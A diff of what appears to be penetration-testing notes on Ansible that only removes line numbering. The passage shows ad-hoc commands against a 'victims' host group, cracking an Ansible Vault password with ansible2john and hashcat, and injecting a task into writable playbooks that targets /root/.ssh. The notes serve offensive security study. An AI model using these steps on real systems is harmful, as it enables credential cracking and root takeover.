@@ -13,7 +13,7 @@ Config in <span style="color:red">/etc/ansible/hosts</span>.
 The _ansibleadm_ user on the controller issues commands.
 From the command machine:
 &nbsp;
-{% highlight shell linenos %}
+{% highlight shell %}
 ansible victims -a "whoami"
 {% endhighlight %}
 &nbsp;
@@ -24,7 +24,7 @@ Sets of tasks written in YAML to be scripted so that they can be run in a routin
 Check this files in <span style="color:red">/opt/playbooks</span> to see if there's any info leakage.
 &nbsp;
 I.E.
-{% highlight yaml linenos %}
+{% highlight yaml %}
 - name: Write a file as offsec
   hosts: all
   gather_facts: true
@@ -43,7 +43,7 @@ I.E.
 &nbsp;
 Ansible has a new features called _Ansible Vault_ to securely store credentials for playbooks:
 &nbsp;
-{% highlight yaml linenos %}
+{% highlight yaml %}
 ansible_become_pass: !vault |
           $ANSIBLE_VAULT;1.1;AES256
           39363631613935326235383232616639613231303638653761666165336131313965663033313232
@@ -55,20 +55,20 @@ ansible_become_pass: !vault |
 &nbsp;
 Copy the hash starting with "$ANSIBLE_VAULT......." and use <span style="color:red">ansible2john</span> to convert it in a crackable way to then:
 &nbsp;
-{% highlight shell linenos %}
+{% highlight shell %}
 hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
 {% endhighlight %}
 &nbsp;
 to then decrypt the vault like:
 &nbsp;
-{% highlight shell linenos %}
+{% highlight shell %}
 cat pw.txt | ansible-vault decrypt
 {% endhighlight %}
 &nbsp;
 Also, if the playbook files used on the controller have world-writable permissions or if we can find a way to write to them (perhaps through an exploit), we can inject tasks that will then be run the next time the playbook is run.
 I.E. to add to the yaml playbook:
 &nbsp;
-{% highlight yaml linenos %}
+{% highlight yaml %}
 - name: Create a directory if it does not exist
       file:
         path: /root/.ssh
